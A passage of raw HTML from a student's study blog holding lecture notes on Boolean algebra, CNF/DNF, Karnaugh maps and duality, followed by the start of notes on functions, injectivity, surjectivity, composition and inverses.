notation"></a>Alternative notation</h2><p>Definition</p><p>The (two-element) <strong>Boolean algebra</strong> is defined to be the set $\mathbb{B}$ ={false,true}, together with the functions  $! :\mathbb{B} \to \mathbb{B}, \&amp;\&amp;: B^2 →B, and \quad ∥: B^2 →B$, defined as follows:</p><div class="table-container"><table><thead><tr><th>x</th><th>!x</th></tr></thead><tbody><tr><td>false</td><td>true</td></tr><tr><td>true</td><td>false</td></tr></tbody></table></div><hr><div class="table-container"><table><thead><tr><th>x</th><th>y</th><th>x&amp;&amp;y</th></tr></thead><tbody><tr><td>false</td><td>false</td><td>false</td></tr><tr><td>false</td><td>true</td><td>false</td></tr><tr><td>true</td><td>false</td><td>false</td></tr><tr><td>true</td><td>true</td><td>true</td></tr></tbody></table></div><hr><div class="table-container"><table><thead><tr><th>x</th><th>y</th><th>x or y</th></tr></thead><tbody><tr><td>false</td><td>false</td><td>false</td></tr><tr><td>false</td><td>true</td><td>true</td></tr><tr><td>true</td><td>false</td><td>true</td></tr><tr><td>true</td><td>true</td><td>true</td></tr></tbody></table></div><h2 id="Properties-Commutativity-Associativity-Distribution-Identity-Complementation"><a href="#Properties-Commutativity-Associativity-Distribution-Identity-Complementation" class="headerlink" title="Properties:Commutativity,Associativity,Distribution,Identity,Complementation"></a>Properties:Commutativity,Associativity,Distribution,Identity,Complementation</h2><p>We observe that !, &amp;&amp;, and ∥ satisfy the following:</p><p>For all $x,y,z ∈ \mathbb{B}$:</p><p>Commutativity</p><script type="math/tex; mode=display">x ∥ y =y ∥x \\x \&\&y =y \&\& x</script><p>Associativity</p><script type="math/tex; mode=display">(x ∥ y) ∥ z =x ∥(y ∥z) \\(x \&\& y) \&\&z =x \&\&(y \&\& z)</script><p>Distribution</p><script type="math/tex; mode=display">x ∥ (y \&\&z) =(x ∥y)\&\&(x ∥ z) \\x \&\&(y ∥z) =(x \&\& y)∥(x \&\& z)</script><p>Identity</p><script type="math/tex; mode=display">x ∥ 0=x \\x \&\& 1=x</script><p>Complementation</p><script type="math/tex; mode=display">x ∥ (!x) = 1 \\x \&\&(!x) = 0</script><h1 id="Boolean-Functions"><a href="#Boolean-Functions" class="headerlink" title="Boolean Functions"></a>Boolean Functions</h1><p>Definition</p><p>An n-<strong>ary Boolean function</strong> is a map f : $\mathbb{B}^n \to \mathbb{B}$.</p><p>Q: How many unary Boolean functions are there? How many binary functions? N-ary?</p><p>$\mathbb{B}^2 \to \mathbb{B}$, we found there are 4 possible inputs and <strong>2 possible outputs of each input</strong>, so here is $2<em>2</em>2<em>2=16$ <em>*possible outputs</em></em>. </p><p><strong>Note, the question didnot mention the specific function, so don’t think 0,0-&gt;0 directly, cause maybe 0,0-&gt;1 function. Additionally, the different outputs should multiple as possible results. Just regard different combination of the outputs as a new function.</strong></p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-12-13-56-57.png" alt></p><p>4 means how many input here.</p><p>How many unary Boolean functions are there? n-ary?</p><p>unary means One-dimensional relation. So how many, it’s 2+2=4 obviously.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-12-13-57-23.png" alt></p><script type="math/tex; mode=display">2^{2^{2}}=4</script><p>So n-ary is:</p><script type="math/tex; mode=display">2^{2^{n}}=</script><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>$!$ is a unary Boolean function</p><p>$\&amp;\&amp;, ∥$ are binary Boolean functions</p><p>$f(x,y) =!(x \&amp;\&amp; y)$ is a binary boolean function (NAND)</p><p>$And(x_0,x_1,…) = (···((x_0 \&amp;\&amp; x_1) \&amp;\&amp; x_2)···)$ is a (family) of Boolean functions</p><p>$Or(x_0,x_1,…) = (···((x_0 ∥ x_1) ∥ x_2)···)$ is a (family) of Boolean functions</p><h2 id="Application-Adding-two-one-bit-numbers"><a href="#Application-Adding-two-one-bit-numbers" class="headerlink" title="Application: Adding two one-bit numbers"></a>Application: Adding two one-bit numbers</h2><p><strong>Question</strong>. How can we implement:</p><p>$add: \mathbb{B}^2 \to \mathbb{B}^2$</p><p>defined as</p><div class="table-container"><table><thead><tr><th>x</th><th>y</th><th>add(x,y)</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>00</td></tr><tr><td>0</td><td>1</td><td>01</td></tr><tr><td>1</td><td>0</td><td>01</td></tr><tr><td>1</td><td>1</td><td>10</td></tr></tbody></table></div><p>Take Notice</p><p>Observe that this is <strong>not</strong> a Boolean function. Boolean functions can output either 0 or 1 (a single bit). This function outputs 2 bits.</p><p><strong>(Short) Answer</strong>. Use two Boolean functions!</p><p>Take Notice</p><p>Digital circuits are just sequences of Boolean functions.</p><h1 id="Conjunctive-and-Disjunctive-Normal-Form"><a href="#Conjunctive-and-Disjunctive-Normal-Form" class="headerlink" title="Conjunctive and Disjunctive Normal Form"></a>Conjunctive and Disjunctive Normal Form</h1><p>Definition</p><p>A <strong>literal</strong> is a unary Boolean function</p><p>A <strong>minterm</strong> is a Boolean function of the form $And(l_1(x_1),l_2(x_2),…,l_n(x_n))$ where the $l_i$ are <strong>literals</strong></p><p>A <strong>maxterm</strong> is a Boolean function of the form $Or(l_1(x_1),l_2(x_2),…,l_n(x_n))$ where the $l_i$ are <strong>literals</strong></p><p>A <strong>CNF Boolean function</strong> is a function of the form $And(m_1,m_2, …)$, where the $m_i$ are <strong>maxterms</strong>.</p><p>A <strong>DNF Boolean function</strong> is a function of the form $Or(m_1,m_2, …)$, where the $m_i$ are <strong>minterms</strong>.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-12-14-45-16.png" alt></p><p>Take Notice</p><p><code>CNF</code>: <strong>product</strong> of <strong>sums</strong>; <code>DNF</code>: <strong>sum</strong> of <strong>products</strong></p><p>秘笈：“C与D或”,“C与小D或大”，“min AND, max OR, C与积，D或和”</p><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><p>Question. Are these functions in CNF? Are they in DNF?</p><script type="math/tex; mode=display">f(x,y,z) = (x \&\& (!y) \&\& z) ∥ (x \&\& (!y) \&\& (!z)) = x \overline{y} z +x \overline{y} \overline{z}</script><p>DNF , but not CNF</p><script type="math/tex; mode=display">g(x,y,z) = (x ∥ (!y) ∥ z) \&\& (x ∥ (!y) ∥ (!z)) = (x +\overline{y} +z)(x +\overline{y} +\overline{z} )</script><p>CNF function, but not DNF</p><script type="math/tex; mode=display">h(x,y,z) = (x \&\& (!y) \&\& z) = x \overline{y} z</script><p><strong>both CNF and DNF</strong></p><p>Note! <strong>Paul Hunter</strong> (lecturor):</p><pre><code>Note: CNF/DNF/minterms/maxterms are only concerned with  how the formula appears as written.  You cannot &quot;change&quot; the formula (e.g. &quot;x can be regarded as x or x&quot;) and have things be meaningful.(x &amp;&amp; !y) &amp;&amp; z is:A maxtermAn OR of maxterms: because OR(m) = m, so it is equal to OR((x&amp;&amp;!y)&amp;&amp;z) - therefore it is in DNFAn AND of minterms: because x is a minterm, !y is a minterm, and z is a minterm, so it is equal to AND(x, !y, z) - therefore it is in CNFLeo Liu:I&#39;m still confused, why x, !y and z are miniterms? Because x = AND(x)? So x can be considered as literal (x), miniterm (AND(x)), and maxterm (OR(x))? Paul Hunter:Yes, that&#39;s correct.AND and OR are &quot;generalizations&quot; of &amp;&amp; and ||.&amp;&amp; and || are functions that take two inputs, AND and OR are (families of) functions that take arbitrarily many inputs.</code></pre><p>My thought:</p><p><img src="/2024/10/12/Math/Boolean-logic/345.png" alt></p><script type="math/tex; mode=display">j(x, y,z) = x +y(z +x)</script><p>Neither CNF nor DNF</p><h2 id="2-Theorems"><a href="#2-Theorems" class="headerlink" title="2 Theorems"></a>2 Theorems</h2><p>Every Boolean function can be written as a function in <strong>DNF</strong>.</p><p>Every Boolean function can be written as a function in <strong>CNF</strong>.</p><h1 id="Canonical-DNF"><a href="#Canonical-DNF" class="headerlink" title="Canonical DNF"></a>Canonical DNF</h1><p>Given an n-ary Boolean function $f: \mathbb{B}^n \to \mathbb{B}$ we construct an equivalent DNF Boolean function as follows:</p><p>For each $b = (b_1, \dots, b_n) \in \mathbb{B}^n$ we define the <strong>minterm</strong></p><p>Note, $\mathbb{B}^n$ means $\mathbb{B} \times \mathbb{B} \times \mathbb{B} \times \dots$, so $b = (b_1, \dots, b_n)$ is a <strong>product (AND)</strong> of them, and the product means <strong>minterm</strong>.</p><script type="math/tex; mode=display">m_b = AND(l_1(x_1),l_2(x_2), \dots,l_n(x_n))</script><p>where</p><script type="math/tex; mode=display">l_i(x_i)=\begin{cases}  x_i \quad  if \quad b_i = 1\\  !x_i \quad  if \quad b_i = 0\end{cases}</script><p>We then define the DNF formula:</p><script type="math/tex; mode=display">f_{DNF} = \sum\limits_{f(b)=1}^{} m_b</script><p>that is, $f_{DNF}$ is the disjunction (or) over all minterms corresponding to elements $b ∈ \mathbb{B}$ where $f(b) = 1$.</p><p>Note, $m_b$ is the each expression of $l_i(x_i)$. Cause we want to build a DNF, so the external operation is <strong>AND()</strong>. </p><p>Note to distinguish the opposite operations. Firstly, $+$ and $\times$; Secondly, $AND()$(CNF,$\times$) and $OR()$(DNF,$+$).</p><p>“C与D或，与乘或加”</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-18-25-31.png" alt></p><h2 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h2><p>f and $f_{DNF}$ are the same function.</p><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p>Find the canonical DNF form of each of the following expressions in variables x,y,z</p><ul><li>$xy$</li><li>$\overline{z}$</li><li>$xy + \overline{z}$</li><li>$f(x,y,z)=1$</li></ul><p>Note Jiaojiao’s handwriting below, the addtional expressions with different colors are the corresponding answers.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-18-43-46.png" alt></p><h1 id="Karnaugh-Maps"><a href="#Karnaugh-Maps" class="headerlink" title="Karnaugh Maps"></a>Karnaugh Maps</h1><p>Jiaojiao remark:”Not very useful.”</p><p>For up to four variables (propositional symbols) a diagrammatic method of simplification called <strong>Karnaugh maps</strong> works quite well.</p><ul><li>For every propositional function of k = 2,3,4 variables we construct a rectangular array of $2^k$ cells.</li><li>Column labels and row labels are ordered by <strong>Gray code</strong>.</li><li>Squares corresponding to the value <em>true</em> are marked with eg “+”.</li><li>We try to cover these squares with as few rectangles with sides 1 or 2 or 4 as possible.</li></ul><h2 id="proof-process-of-Karnaugh-Maps-K-Maps-for-short"><a href="#proof-process-of-Karnaugh-Maps-K-Maps-for-short" class="headerlink" title="proof process of Karnaugh Maps (K Maps for short)"></a>proof process of Karnaugh Maps (K Maps for short)</h2><p>The section would be in Chinese… just for next quiz of Data Structure.</p><p>卡诺图只是为了获取一个随机DNF的方法。</p><p>首先需要找到变量 <code>w,x,y,z</code>,然后我们还知道 <code>f(w, x, y, z)</code>, 我们先做一个<strong>真值表(Truth table)</strong>,然后我们让<code>f(w, x, y, z)</code>是随机的0或1.</p><p>如下图，右侧真值表，得到左侧卡诺图，这是我们的题目，我们在随机真值的cell中打’+’</p><p><img src="/2024/10/12/Math/Boolean-logic/KMaps.jpg" alt></p><p>画卡诺图，比如4变量，就画4x4=16的table，如果是3变量，就画3x3=9的table。</p><p>注意table的title，行列的title一次只变一个。比如，wx-&gt;w!x-&gt;!w!x-&gt;!wx, 不要一下子wx-&gt;!w!x，这样会错。</p><h2 id="Why-how-to-use-Karnaugh-Maps"><a href="#Why-how-to-use-Karnaugh-Maps" class="headerlink" title="Why, how to use Karnaugh Maps"></a>Why, how to use Karnaugh Maps</h2><p>接下来说卡诺图能解决的问题，主要就是为了消除单个minterm的无关变量，获得DNF的所有minterms。</p><p>圈的时候，从最大往最小圈，记得每行每列首位相连。如图，左下侧俩和左上侧俩是最大的，因为一下子占2x2的方的四个cells，所以先圈他俩。</p><p>然后开始往小圈，全部的+都被圈完后，就可以得到minterms。</p><p>比如图中，有个孤零零的<code>w!x!y!z</code>，肯定是最后圈，可惜消不了任何变量，因此这个minterm就是<code>w!x!y!z</code>。</p><h2 id="how-to-correctly-circle-to-eliminate-variables"><a href="#how-to-correctly-circle-to-eliminate-variables" class="headerlink" title="how to correctly circle to eliminate variables?"></a>how to correctly circle to eliminate variables?</h2><p><img src="/2024/10/12/Math/Boolean-logic/KMap_wrong.png" alt></p><p>In the pic of the sample before mid-term test, it is wrong. Because it is not $n \times m$ cells with full $+$.</p><p><img src="/2024/10/12/Math/Boolean-logic/correct_circle_karnau.png" alt></p><p>Follow me, it is the correct way to circle them. We must circle $n \times m$ cells with fully $+$.</p><p>blue:xy</p><p>green: xz</p><p>red: yz</p><h2 id="example-1"><a href="#example-1" class="headerlink" title="example"></a>example</h2><p>Note, the Karnaugh Map is at the first, and then we got the Expression. Don’t confuse the order of the pic and the expression.</p><p>Use $2^n$ to circle the cells, and cover all the true cells.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-17-42-36.png" alt></p><script type="math/tex; mode=display">E = (xy) \lor (\overline{x} \overline{y}) \lor (z)</script><p>Canonical form would consist of writing all cells separately (6 clauses).</p><p>For optimisation, the idea is to cover the + squares with the minimum number of rectangles. One cannot cover any empty cells.</p><ul><li>The rectangles can go ‘around the corner’/the actual map should be seen as a torus.</li><li>Rectangles must have sides of 1, 2 or 4 squares (three adjacent cells are useless).</li></ul><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-17-44-21.png" alt></p><p>Of course it is similar to the manual calcute the 0 and 1.</p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-19-23-15.png" alt></p><h2 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise"></a>Exercise</h2><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-17-44-39.png" alt></p><p><img src="/2024/10/12/Math/Boolean-logic/Kmap-1.png" alt></p><p><img src="/2024/10/12/Math/Boolean-logic/2024-10-13-19-22-11.png" alt></p><p>The Karnaught Map just generate the expression rapidly.</p><h1 id="Boolean-Algebras"><a href="#Boolean-Algebras" class="headerlink" title="Boolean Algebras"></a>Boolean Algebras</h1><h2 id="definition"><a href="#definition" class="headerlink" title="definition"></a>definition</h2><p>A <strong>Boolean algebra</strong> is a structure $(T, \lor, \land, ‘, 0, 1)$ where</p><ul><li>0, 1 ∈ T</li><li>∨,∧ : T ×T →T (called <strong>join</strong> and <strong>meet</strong> respectively)</li><li>′ : T→T (called <strong>complementation</strong>)</li></ul><h2 id="property"><a href="#property" class="headerlink" title="property"></a>property</h2><p>and the following laws hold for all x,y,z ∈ T:</p><p>Commutativity:</p><script type="math/tex; mode=display">x ∨y =y ∨x, x∧y =y∧x</script><p>Associativity:</p><script type="math/tex; mode=display">(x ∨y)∨z =x ∨(y ∨z)\\(x ∧y)∧z =x ∧(y ∧z)</script><p>Distributivity:</p><script type="math/tex; mode=display">x ∨(y ∧z) =(x ∨y)∧(x ∨z) \\x ∧(y ∨z) =(x ∧y)∨(x ∧z)</script><p>Identity:</p><script type="math/tex; mode=display">x ∨0=x, x∧1=x</script><p>Complementation:</p><script type="math/tex; mode=display">x∨x' =1, x ∧x' =0</script><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>The set of subsets of a (singleton) set X = {x}:</p><ul><li>T : Pow(X)=<code>&#123;&#123;x&#125;,∅&#125;</code></li><li>∨ (join) : ∪</li><li>∧ (meet) : ∩</li><li>′ (complement) : $·^c$</li><li>0 : ∅</li><li>1 : $X \qquad (\mathbb{U})$</li></ul><p>The Laws of Boolean algebra follow from the Laws of Set Operations.</p><hr><p>The two element Boolean Algebra :</p><script type="math/tex; mode=display">B =(\{true,false\},∥,\&\&,!,false,true)</script><p>where !,&amp;&amp;,∥ are defined as:</p><ul><li>!true = false; !false = true,</li><li>true &amp;&amp; true = true; …</li><li>true ∥ true = true; …</li></ul><hr><p>Cartesian products of $\mathbb{B}$, that is n-tuples of 0’s and 1’s with Boolean operations, e.g. $\mathbb{B}^4$:</p><p>join: $(1,0,0,1) ∨ (1,1,0,0) = (1,1,0,1)$</p><p>meet: $(1,0,0,1) ∧ (1,1,0,0) = (1,0,0,0)$</p><p>complement: $(1,0,0,1)’ = (0,1,1,0)$</p><p>0 : $(0,0,0,0)$</p><p>1 : $(1,1,1,1)$</p><hr><p>Functions from any set $S$ to $\mathbb{B}$; that is, $\mathbb{B}^S$</p><p>If $f,g:S \to \mathbb{B}$ then</p><script type="math/tex; mode=display">(f ∨g) : S →B \quad defined by \quad s →f(s)∥g(s)</script><script type="math/tex; mode=display">(f ∧g) : S →B \quad defined by \quad s →f(s)\&\&g(s)</script><script type="math/tex; mode=display">f' : S →B \quad defined by \quad s→!f(s)</script><script type="math/tex; mode=display">0 : S →B \quad is the function \quad s → 0</script><script type="math/tex; mode=display">1 : S →B \quad is the function \quad s → 1</script><h2 id="Proofs-in-Boolean-Algebras"><a href="#Proofs-in-Boolean-Algebras" class="headerlink" title="Proofs in Boolean Algebras"></a>Proofs in Boolean Algebras</h2><p>If you can show that an identity holds using the laws of Boolean Algebra, then that identity holds <strong>in all Boolean Algebras</strong>.</p><p>Example</p><p><strong>Claim</strong>: In all Boolean Algebras</p><script type="math/tex; mode=display">x ∧x =x \quad \text{for all } x ∈ T.</script><p><strong>Proof</strong>:</p><script type="math/tex; mode=display">x = \\x∧1 \quad [Identity] \\=x ∧(x ∨x') \quad [Complement] \\=(x ∧x)∨(x ∧x') \quad [Distributivity] \\=(x ∧x)∨0 \quad [Complement] \\=(x ∧x) \quad [Identity]</script><h2 id="Duality"><a href="#Duality" class="headerlink" title="Duality"></a>Duality</h2><h3 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h3><p>If $E$ is an expression defined using variables $(x, y, z, etc)$, constants $(0 and 1)$, and the operations of Boolean Algebra $(∧, ∨, and ‘)$ then $dual(E)$ is the expression obtained by replacing $∧$ with $∨$ (and vice-versa) and $0$ with $1$ (and vice-versa).</p><h3 id="Definition-1"><a href="#Definition-1" class="headerlink" title="Definition"></a>Definition</h3><p>If $(T,∨,∧, ‘,0,1)$ is a Boolean Algebra, then $(T,∧,∨, ‘,1,0)$ is also a Boolean algebra, known as the <strong>dual Boolean algebra</strong>.</p><p>(Dual means the contray operation and element: ∨-&gt;∧; ∧-&gt;∨; 0-&gt;1; 1-&gt;0; )</p><h3 id="Theorem-Principle-of-duality"><a href="#Theorem-Principle-of-duality" class="headerlink" title="Theorem (Principle of duality)"></a>Theorem (Principle of duality)</h3><p>If you can show $E_1 = E_2$ using the laws of Boolean Algebra, then $dual(E_1) = dual(E_2)$.</p><h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><p>We have shown $x ∧x = x$.</p><p>By duality: $x ∨ x = x$.</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Functions</title>
      <link href="/2024/10/11/Math/Functions/"/>
      <url>/2024/10/11/Math/Functions/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#functions-recap">Functions Recap</a><ul><li><a href="#five-properties-fun-tot-inj-sur-bij">five properties fun-tot-inj-sur-bij</a></li><li><a href="#definition-of-function">Definition of function</a><ul><li><a href="#example">example</a></li></ul></li><li><a href="#injective-functions">Injective functions</a><ul><li><a href="#examples">Examples</a><ul><li><a href="#functions-that-are-injective">functions that are injective</a></li><li><a href="#functions-that-are-not-injective">functions that are not injective</a></li></ul></li></ul></li><li><a href="#surjective-functions">Surjective functions</a><ul><li><a href="#examples-1">Examples</a><ul><li><a href="#functions-that-are-surjective">functions that are surjective</a></li><li><a href="#functions-that-are-not-surjective">functions that are not surjective</a></li></ul></li></ul></li><li><a href="#bijection-functions">Bijection functions</a></li><li><a href="#functions-on-finite-sets">Functions on finite sets</a></li></ul></li><li><a href="#functional-composition">Functional Composition</a><ul><li><a href="#definition">Definition</a></li><li><a href="#iteration-of-functions">Iteration of Functions</a></li><li><a href="#exercise">exercise</a></li></ul></li><li><a href="#inverse-functions">Inverse Functions</a><ul><li><a href="#properties-of-the-inverse">Properties of the inverse</a><ul><li><a href="#exercises">Exercises</a></li></ul></li></ul></li><li><a href="#matrices">Matrices</a><ul><li><a href="#matrix-motivation">Matrix Motivation</a></li><li><a href="#basic-matrix-operations">Basic Matrix Operations</a></li><li><a href="#matrix-sum">Matrix Sum</a></li><li><a href="#scalar-product">Scalar Product</a></li><li><a href="#matrix-product">Matrix Product</a></li></ul></li><li><a href="#endbmatrix">\end{bmatrix}</a><ul><li><a href="#computer-graphics">Computer Graphics</a></li></ul></li><li><a href="#introduction-to-big-o-notation">Introduction to Big-O Notation</a><ul><li><a href="#motivation">Motivation</a><ul><li><a href="#example-algorithmic-analysis">example: Algorithmic analysis</a></li></ul></li><li><a href="#big-o-asymptotic-upper-bounds">“Big-O” Asymptotic Upper Bounds</a><ul><li><a href="#example-1">example</a></li></ul></li><li><a href="#properties">properties</a><ul><li><a href="#example-2">example</a></li></ul></li><li><a href="#big-omega-asymptotic-lower-bounds">“Big-Omega” Asymptotic Lower Bounds</a><ul><li><a href="#example-3">Example</a></li></ul></li><li><a href="#big-theta-notation">“Big-Theta” Notation</a><ul><li><a href="#properties-1">Properties</a></li><li><a href="#observations">Observations</a><ul><li><a href="#examples-2">Examples</a></li><li><a href="#exercises-1">Exercises</a></li></ul></li></ul></li></ul></li></ul><h1 id="Functions-Recap"><a href="#Functions-Recap" class="headerlink" title="Functions Recap"></a>Functions Recap</h1><h2 id="five-properties-fun-tot-inj-sur-bij"><a href="#five-properties-fun-tot-inj-sur-bij" class="headerlink" title="five properties fun-tot-inj-sur-bij"></a>five properties fun-tot-inj-sur-bij</h2><p><a href="https://senranja.github.io/2024/10/03/Math/relation/#definition-of-five-properties-of-binary-relations-fun-tot-inj-sur-bij-of-r-subseteq-s-times-t">binary relation’s five properties: fun-tot-inj-sur-bij</a></p><h2 id="Definition-of-function"><a href="#Definition-of-function" class="headerlink" title="Definition of function"></a>Definition of function</h2><p>A function, f : S → T, is a binary relation f ⊆ S ×T that satisfies <strong>(Fun)</strong> and <strong>(Tot)</strong>. That is, for all s ∈ S there is exactly one t ∈ T such that (s,t) ∈ f.</p><p>We write f(s) for the unique element related to s.</p><p>We write $T^S$ for the set of all functions from S to T.</p><p>f : S →T describes pairing of the sets: it means that f assigns to every element s ∈ S a unique element t ∈ T. To emphasise where a specific element is sent, we can write f : x → y, which means the same as f(x) = y</p><div class="table-container"><table><thead><tr><th>Symbol</th><th>Symbol</th><th>Symbol</th><th>Description</th></tr></thead><tbody><tr><td>S</td><td>domain of f</td><td>Dom(f)</td><td>(inputs)</td></tr><tr><td>T</td><td>co-domain of f</td><td>Codom(f)</td><td>(possible outputs)</td></tr><tr><td>f(S)</td><td>image of f</td><td>Im(f)</td><td>(actual outputs)</td></tr><tr><td>S</td><td>domain of f</td><td>Dom(f)</td><td>(inputs)</td></tr></tbody></table></div><h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><p>The <strong>identity function</strong> on S</p><script type="math/tex; mode=display">Id_S(x) = x,x ∈ S</script><script type="math/tex; mode=display">Dom(Id_S) = S \\Codom(Id_S) = S \\Im(Id_S) = S</script><p>Important!</p><p>The <strong>domain</strong> and <strong>co-domain</strong> are critical aspects of <strong>a function</strong>’s definition.</p><p>$f: \mathbb{N} \rightarrow \mathbb{Z}$ given by $f(x)=x^2$</p><p>and</p><p>$g: \mathbb{N} \rightarrow \mathbb{N}$ given by $g(x)=x^2$</p><p><strong>are different functions</strong> even though they have the same behaviour!</p><h2 id="Injective-functions"><a href="#Injective-functions" class="headerlink" title="Injective functions"></a>Injective functions</h2><p>Function $f : S → T$ is called an injection or 1-1 (one-to-one) if it satisfies (Inj)</p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><h4 id="functions-that-are-injective"><a href="#functions-that-are-injective" class="headerlink" title="functions that are injective"></a>functions that are injective</h4><p>$f : N→N$ with $f(x) → x$</p><p>set complement (for a fixed universe)</p><h4 id="functions-that-are-not-injective"><a href="#functions-that-are-not-injective" class="headerlink" title="functions that are not injective"></a>functions that are not injective</h4><p>absolute value, floor, ceiling</p><p>length of a word</p><h2 id="Surjective-functions"><a href="#Surjective-functions" class="headerlink" title="Surjective functions"></a>Surjective functions</h2><p>Function $f : S → T$ is called a <strong>surjection</strong> or <strong>onto</strong> if it satisfies (Sur). That is, if</p><script type="math/tex; mode=display">Im(f ) = Codom(f)</script><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><h4 id="functions-that-are-surjective"><a href="#functions-that-are-surjective" class="headerlink" title="functions that are surjective"></a>functions that are surjective</h4><p>$f : \mathbb{N} → \mathbb{N} \quad with \quad f(x) → x$</p><p>Floor, ceiling</p><h4 id="functions-that-are-not-surjective"><a href="#functions-that-are-not-surjective" class="headerlink" title="functions that are not surjective"></a>functions that are not surjective</h4><p>$f : \mathbb{N} → \mathbb{N} \quad with \quad f(x) → x^2$</p><script type="math/tex; mode=display">f : \{a,...,e\}^∗ → \{a,...,e\}^∗ \quad with \quad f(w) → awe</script><h2 id="Bijection-functions"><a href="#Bijection-functions" class="headerlink" title="Bijection functions"></a>Bijection functions</h2><p>Both (Inj) and (Suj) functions</p><h2 id="Functions-on-finite-sets"><a href="#Functions-on-finite-sets" class="headerlink" title="Functions on finite sets"></a>Functions on finite sets</h2><p>Take Notice</p><p>For a <strong>finite</strong> set S and $f : S → S$ the properties <strong><code>surjective</code></strong> and <strong><code>injective</code></strong> are equivalent.</p><h1 id="Functional-Composition"><a href="#Functional-Composition" class="headerlink" title="Functional Composition"></a>Functional Composition</h1><p>Q: If $f : S →T$ and $g :T →U$ are functions, then $f;g$ is a relation. When is it a function?</p><p>A: In the lecture, I said Injective. But Jiaojiao smiled and questioned ‘Is it sufficient?’. The correct answer is ‘Bijective’. </p><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p>If $f : S →T$ and $g :T →U$ then the <strong>composition</strong> of f and g, written $g◦f$ , is the function given by</p><script type="math/tex; mode=display">(g ◦ f)(x) = g(f(x))</script><p>That is, <strong>g ◦ f</strong> = <strong>f;g</strong>.</p><p><strong>Take note of the order between f and g.</strong> <strong>f;g</strong> means f first and then g, and g ◦ f is the same of g(f(x)).</p><p>Facts</p><p>Composition is associative</p><p>h ◦(g ◦f) = (h◦g)◦f</p><p>For $g : S →T$ (note the g is different from the g above)</p><script type="math/tex; mode=display">g ◦Id_S = g \quad and \quad Id_T ◦g =g</script><p>S-&gt;S-&gt;T and S-&gt;T-&gt;T</p><h2 id="Iteration-of-Functions"><a href="#Iteration-of-Functions" class="headerlink" title="Iteration of Functions"></a>Iteration of Functions</h2><p>If a function maps a set into itself, i.e. when Dom(f) = Codom(f), the function can be composed with itself — <strong>iterated</strong></p><script type="math/tex; mode=display">f ◦f,f ◦f ◦f,..., \text{ also written } f^2,f^3, \dots</script><h2 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h2><p>Let $f ,g : \mathbb{Z} → \mathbb{Z}$ be given by $f(n) = n^2 +3$ and $g(n) = 5n−11$. What is:</p><script type="math/tex; mode=display">f◦g(n) = (5n−11)^2 +3\\g◦f(n) = 5(n^2+3)-11\\g^2(n) = 5(5n-11)-11</script><h1 id="Inverse-Functions"><a href="#Inverse-Functions" class="headerlink" title="Inverse Functions"></a>Inverse Functions</h1><p>Converse of a function</p><p>Q: If $f : S →T$, then $f^\leftarrow$ is a relation; when is it a function?</p><p>A: bijective</p><p>If $f^\leftarrow$ is a function then it is called the <strong>inverse function</strong>; denoted $f^{−1}$.</p><p>Take Notice</p><p>$f^{−1}$ only exists if f is a bijection.</p><p>$f^←$ always exists.</p><p>$f^{−1}$ is the procedure of “undoing” f .</p><p><img src="/2024/10/11/Math/Functions/inverse_definition.png" alt></p><p><img src="/2024/10/11/Math/Functions/inverse_non_fun.png" alt></p><h2 id="Properties-of-the-inverse"><a href="#Properties-of-the-inverse" class="headerlink" title="Properties of the inverse"></a>Properties of the inverse</h2><p>If $f : S →T$ and $f^{−1}$ exists then:</p><script type="math/tex; mode=display">f^{−1} ◦f = Id_S \quad and \quad f◦f^{−1} =Id_T</script><p>Conversely, if $f : S → T \quad and \quad g : T → S$ and</p><script type="math/tex; mode=display">g◦f =Id_S \quad and \quad f ◦g =Id_T</script><p>then $f^{−1}$ exists and is equal to g.</p><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>Q:<br>f and g are ‘shift’ functions $\mathbb{N}→\mathbb{N}$ defined by f(n)=n+1, and g(n)=max(0,n−1)</p><p>(c) Is f injective? surjective?</p><p>A:<br>f(n)=n+1 (Inj) but 0 belongs to the co-domain, and f(n) cannot point 0, so it is not (Sur)</p><p>(d) Is g injective? surjective?</p><p>g(n)=max{0,n−1}, g(0)=g(1)=0, so g(n) is not (Inj), it is (Suj)</p><p>(e) Do f and g commute, i.e. ∀n((f◦g)(n) = (g◦f)(n))?</p><p>f(g(n))=g(n)+1=max{0, n-1}+1=max{1,n}, n belongs to Natural Number. The function’s result = 1 if n=0; =n if n&gt;=1</p><p>g(f(n))=max{0,n+1-1}=max{0,n}</p><p>Thus f and g don’t commute.</p><hr><p>Q:<br>Σ={a,b,c}</p><p>(c) Is length:$Σ^∗→\mathbb{N} \quad surjective$?</p><p>A:Yes, it is (Surj), $\lambda, a, aa, aaa, aaaa, \dots$.</p><p>(d) $length^←(2)\overset{?}{=}$</p><p>A:{aa,ab,ac,ba,bb,bc,ca,cb,cc}</p><hr><p>Q:<br>Verifythat $f:\mathbb{R} \times \mathbb{R}→\mathbb{R} \times \mathbb{R}$ defined by $f(x,y)=(x+y,x−y)$ is invertible.</p><p>A: to prove the function is 